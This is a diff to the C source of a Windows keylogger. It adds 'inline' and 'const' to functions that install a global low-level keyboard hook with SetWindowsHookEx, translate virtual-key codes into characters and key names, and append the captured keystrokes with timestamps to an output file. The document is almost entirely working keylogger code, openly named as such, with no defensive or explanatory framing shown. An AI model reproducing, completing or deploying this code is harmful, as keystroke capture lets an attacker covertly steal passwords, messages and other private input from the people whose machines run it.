@@ -37,7 +37,7 @@ void logToOutFile(const char *format, ...) {
 }
 
 
-void logCurrentTime(void)
+inline void logCurrentTime(void)
 {
     struct tm newtime;
     time_t now = time(0);
@@ -50,7 +50,7 @@ void logCurrentTime(void)
 }
 
 
-const char *getSpecialKeyName(DWORD vkCode) {
+inline const char *getSpecialKeyName(const DWORD vkCode) {
     switch (vkCode) {
         case VK_SHIFT:
             return "SHIFT";
@@ -109,7 +109,7 @@ const char *getSpecialKeyName(DWORD vkCode) {
 }
 
 
-const char getCharFromVKCode(DWORD vkCode) {
+inline const char getCharFromVKCode(const DWORD vkCode) {
     if ((vkCode == VK_SPACE) ||
         (vkCode >= VK_0 && vkCode <= VK_9) ||
         (vkCode >= VK_A && vkCode <= VK_Z)) {
@@ -150,7 +150,7 @@ void onKeyPressed(const DWORD vkCode)
 }
 
 
-LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+inline LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
         KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT*)lParam;
 
@@ -163,13 +163,13 @@ LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 
-const HHOOK setHook(void)
+inline const HHOOK setHook(void)
 {
     return SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(NULL), 0);
 }
 
 
-const errno_t setupKeyLogger(const char *outFileName) {
+inline const errno_t setupKeyLogger(const char *outFileName) {
     const errno_t fileErr = fopen_s(&outFile, outFileName, "a");
     if (fileErr) return fileErr; 
 
@@ -180,7 +180,7 @@ const errno_t setupKeyLogger(const char *outFileName) {
 }
 
 
-void startLogging(void)
+inline void startLogging(void)
 {
     logCurrentTime();
 
